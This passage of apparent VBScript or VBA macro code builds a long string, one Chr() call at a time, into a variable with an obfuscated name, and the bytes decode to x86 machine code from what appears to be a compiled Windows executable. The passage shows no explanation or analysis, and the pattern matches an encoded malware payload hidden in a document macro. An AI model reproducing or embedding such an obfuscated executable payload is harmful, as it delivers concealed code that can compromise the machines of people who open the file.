ySXd=ySXd&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(127)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(16)&Chr(232)&Chr(110)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(96)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(225)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(70)&Chr(36)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(52)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(44)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(38)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(52)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(24)&Chr(26)&Chr(0)&Chr(0)&Chr(89)
ySXd=ySXd&Chr(139)&Chr(70)&Chr(60)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(10)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(64)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(252)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(68)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(238)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(72)&Chr(133)&Chr(192)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(224)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(70)&Chr(92)&Chr(61)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(207)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(106)&Chr(13)&Chr(232)&Chr(172)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(126)&Chr(104)&Chr(133)&Chr(255)&Chr(116)&Chr(26)&Chr(87)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)
ySXd=ySXd&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(255)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(87)&Chr(232)&Chr(162)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(115)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(126)&Chr(108)&Chr(133)&Chr(255)&Chr(116)&Chr(35)&Chr(87)&Chr(232)&Chr(35)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(20)&Chr(129)&Chr(255)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(12)&Chr(131)&Chr(63)&Chr(0)&Chr(117)&Chr(7)&Chr(87)&Chr(232)&Chr(47)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(86)
ySXd=ySXd&Chr(232)&Chr(74)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(30)&Chr(2)&Chr(0)&Chr(0)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(66)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(12)&Chr(232)&Chr(54)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(94)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(224)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(104)&Chr(212)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(255)&Chr(214)&Chr(104)&Chr(200)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(104)&Chr(192)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(131)&Chr(61)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(131)&Chr(61)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(13)&Chr(131)&Chr(61)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(4)&Chr(133)&Chr(192)&Chr(117)&Chr(36)&Chr(161)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(161)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(215)&Chr(32)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(204)&Chr(176)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(80)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(15)&Chr(132)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(34)&Chr(240)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(19)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(3)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(243)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(204)&Chr(176)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(120)&Chr(3)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(101)&Chr(104)&Chr(203)&Chr(34)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(61)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(163)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(72)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(181)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(52)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(27)&Chr(106)&Chr(0)
ySXd=ySXd&Chr(86)&Chr(232)&Chr(231)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(7)&Chr(232)&Chr(146)&Chr(251)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(8)&Chr(106)&Chr(0)&Chr(15)&Chr(148)&Chr(192)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(108)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(2)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(163)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(204)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(16)
ySXd=ySXd&Chr(137)&Chr(108)&Chr(36)&Chr(16)&Chr(141)&Chr(108)&Chr(36)&Chr(16)&Chr(43)&Chr(224)&Chr(83)&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(252)&Chr(51)&Chr(197)&Chr(80)&Chr(137)&Chr(101)&Chr(232)&Chr(255)&Chr(117)&Chr(248)&Chr(139)&Chr(69)&Chr(252)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(248)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(81)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(139)&Chr(93)&Chr(12)
ySXd=ySXd&Chr(86)&Chr(139)&Chr(115)&Chr(8)&Chr(51)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(6)&Chr(198)&Chr(69)&Chr(255)&Chr(0)&Chr(199)&Chr(69)&Chr(244)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(123)&Chr(16)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(70)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(117)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(246)&Chr(64)&Chr(4)&Chr(102)&Chr(15)&Chr(133)&Chr(22)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(16)&Chr(141)&Chr(85)&Chr(232)&Chr(137)&Chr(83)&Chr(252)&Chr(139)&Chr(91)&Chr(12)&Chr(137)&Chr(69)&Chr(232)&Chr(137)&Chr(77)&Chr(236)&Chr(131)&Chr(251)&Chr(254)&Chr(116)&Chr(95)&Chr(141)&Chr(73)&Chr(0)
ySXd=ySXd&Chr(141)&Chr(4)&Chr(91)&Chr(139)&Chr(76)&Chr(134)&Chr(20)&Chr(141)&Chr(68)&Chr(134)&Chr(16)&Chr(137)&Chr(69)&Chr(240)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(133)&Chr(201)&Chr(116)&Chr(20)&Chr(139)&Chr(215)&Chr(232)&Chr(52)&Chr(42)&Chr(0)&Chr(0)&Chr(198)&Chr(69)&Chr(255)&Chr(1)&Chr(133)&Chr(192)&Chr(124)&Chr(64)&Chr(127)&Chr(71)&Chr(139)&Chr(69)&Chr(248)&Chr(139)&Chr(216)&Chr(131)&Chr(248)&Chr(254)&Chr(117)&Chr(206)&Chr(128)&Chr(125)&Chr(255)&Chr(0)&Chr(116)&Chr(36)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(2)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(242)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)
ySXd=ySXd&Chr(93)&Chr(195)&Chr(199)&Chr(69)&Chr(244)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(201)&Chr(139)&Chr(77)&Chr(8)&Chr(129)&Chr(57)&Chr(99)&Chr(115)&Chr(109)&Chr(224)&Chr(117)&Chr(41)&Chr(131)&Chr(61)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(32)&Chr(104)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(232)&Chr(195)&Chr(6)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(85)&Chr(8)&Chr(106)&Chr(1)&Chr(82)&Chr(255)&Chr(21)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(232)&Chr(215)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(57)&Chr(88)&Chr(12)&Chr(116)&Chr(18)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(211)&Chr(139)&Chr(200)&Chr(232)&Chr(218)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(248)
ySXd=ySXd&Chr(137)&Chr(72)&Chr(12)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(111)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(95)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(72)&Chr(8)&Chr(139)&Chr(215)&Chr(232)&Chr(109)&Chr(41)&Chr(0)&Chr(0)&Chr(186)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(57)&Chr(83)&Chr(12)&Chr(15)&Chr(132)&Chr(82)&Chr(255)&Chr(255)&Chr(255)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(203)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(233)&Chr(28)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(248)
ySXd=ySXd&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(83)&Chr(87)&Chr(191)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(187)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(13)&Chr(133)&Chr(195)&Chr(116)&Chr(9)&Chr(247)&Chr(208)&Chr(163)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(86)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(255)&Chr(21)&Chr(132)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(51)&Chr(117)&Chr(248)&Chr(255)&Chr(21)&Chr(128)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(124)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(141)&Chr(69)&Chr(240)&Chr(80)&Chr(255)&Chr(21)&Chr(120)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(51)&Chr(69)&Chr(240)&Chr(51)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(7)&Chr(190)&Chr(79)&Chr(230)
ySXd=ySXd&Chr(64)&Chr(187)&Chr(235)&Chr(11)&Chr(133)&Chr(243)&Chr(117)&Chr(7)&Chr(139)&Chr(198)&Chr(193)&Chr(224)&Chr(16)&Chr(11)&Chr(240)&Chr(137)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(247)&Chr(214)&Chr(137)&Chr(53)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(94)&Chr(95)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(136)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(106)&Chr(253)&Chr(255)&Chr(255)&Chr(232)&Chr(94)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(120)&Chr(133)&Chr(192)&Chr(116)&Chr(22)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(208)&Chr(235)&Chr(7)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(206)&Chr(40)&Chr(0)&Chr(0)&Chr(232)&Chr(131)&Chr(253)&Chr(255)&Chr(255)&Chr(195)&Chr(104)&Chr(66)&Chr(40)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(247)&Chr(255)
ySXd=ySXd&Chr(255)&Chr(89)&Chr(163)&Chr(216)&Chr(176)&Chr(64)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(191)&Chr(224)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(60)&Chr(245)&Chr(36)&Chr(161)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(30)&Chr(141)&Chr(4)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(137)&Chr(56)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(255)&Chr(48)&Chr(131)&Chr(199)&Chr(24)&Chr(232)&Chr(35)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(70)&Chr(131)&Chr(254)&Chr(36)&Chr(124)&Chr(210)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(195)&Chr(131)&Chr(36)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(241)&Chr(139)&Chr(255)&Chr(83)&Chr(139)&Chr(29)&Chr(72)&Chr(128)&Chr(64)&Chr(0)&Chr(86)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(87)&Chr(139)
ySXd=ySXd&Chr(62)&Chr(133)&Chr(255)&Chr(116)&Chr(19)&Chr(131)&Chr(126)&Chr(4)&Chr(1)&Chr(116)&Chr(13)&Chr(87)&Chr(255)&Chr(211)&Chr(87)&Chr(232)&Chr(39)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(38)&Chr(0)&Chr(89)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(220)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(6)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(103)&Chr(4)&Chr(1)&Chr(117)&Chr(3)&Chr(80)&Chr(255)&Chr(211)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(230)&Chr(94)&Chr(91)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(255)&Chr(52)&Chr(197)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(136)&Chr(128)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(147)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(232)&Chr(103)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(125)&Chr(228)&Chr(51)&Chr(219)&Chr(57)&Chr(29)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(129)&Chr(237)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(207)&Chr(235)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(17)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(117)&Chr(8)&Chr(141)&Chr(52)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(57)&Chr(30)&Chr(116)&Chr(4)&Chr(139)&Chr(199)&Chr(235)&Chr(110)&Chr(106)&Chr(24)&Chr(232)&Chr(31)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(232)&Chr(60)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(81)&Chr(106)&Chr(10)&Chr(232)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(89)
ySXd=ySXd&Chr(137)&Chr(93)&Chr(252)&Chr(57)&Chr(30)&Chr(117)&Chr(44)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(87)&Chr(232)&Chr(26)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(23)&Chr(87)&Chr(232)&Chr(85)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(6)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(11)&Chr(137)&Chr(62)&Chr(235)&Chr(7)&Chr(87)&Chr(232)&Chr(58)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(255)&Chr(251)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(10)&Chr(232)&Chr(40)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(141)&Chr(52)&Chr(197)
ySXd=ySXd&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(62)&Chr(0)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(34)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(17)&Chr(232)&Chr(5)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(54)&Chr(255)&Chr(21)&Chr(140)&Chr(128)&Chr(64)&Chr(0)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(165)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(0)&Chr(83)&Chr(106)&Chr(76)&Chr(141)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(249)&Chr(39)&Chr(0)&Chr(0)&Chr(141)
ySXd=ySXd&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)
